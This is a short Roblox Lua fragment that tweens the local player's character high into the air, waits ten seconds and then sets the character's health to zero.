tween = tweenService:Create(game:GetService("Players")["LocalPlayer"].Character.HumanoidRootPart, tweenInfo, {CFrame = CFrame.new(0, 9000, 0)})
tween:Play()
wait(10)
game.Players.LocalPlayer.Character.Humanoid.Health = 0
